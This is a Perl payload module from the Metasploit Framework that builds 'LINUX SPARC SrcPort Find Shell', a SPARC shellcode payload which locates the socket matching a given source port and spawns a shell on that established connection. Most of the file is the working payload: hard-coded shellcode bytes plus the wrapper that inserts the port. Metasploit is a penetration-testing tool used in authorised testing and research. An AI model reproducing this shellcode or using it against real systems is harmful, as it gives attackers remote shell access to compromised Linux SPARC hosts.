
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::linux_sparc_findsock;
use base 'Msf::PayloadComponent::FindConnection';
use strict;
use Pex::SPARC;

my $info =
{
  'Name'         => 'LINUX SPARC SrcPort Find Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Spawn a shell on the established connection',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
  'Arch'         => [ 'sparc' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => '',
  'UserOpts'     =>
    {
      'CPORT' => [1, 'PORT', 'Local port used by exploit'],
    }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('CPORT')));
}

sub Generate {
  my $self = shift;
  my $port = shift;

  my $shellcode =
    Pex::SPARC::Set($port, "l6").
    "\x9c\x2b\xa0\x07\x90\x1a\x80\x0a\xd0\x23\xbf\xe0\x90\x02\x20\x01".
    "\x90\x0a\x2f\xff\x96\x10\x20\x10\x94\x23\xa0\x04\x92\x23\xa0\x20".
    "\xd0\x3b\xbf\xf0\xd4\x3b\xbf\xf8\x92\x23\xa0\x10\x90\x10\x20\x07".
    "\x82\x10\x20\xce\x91\xd0\x20\x10\x92\x10\x20\x03\xea\x13\xbf\xe2".
    "\xba\x9d\x40\x16\x12\xbf\xff\xf2\xd0\x03\xbf\xf0\x92\xa2\x60\x01".
    "\x82\x10\x20\x5a\x91\xd0\x20\x10\x12\xbf\xff\xfc\x96\x1a\xc0\x0b".
    "\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xdc\xda\x90\x23\xa0\x10".
    "\x92\x23\xa0\x08\xe0\x3b\xbf\xf0\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc".
    "\x82\x10\x20\x3b\x91\xd0\x20\x08";

  return $shellcode;
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('4444');
  return(length($bin));
}

1;
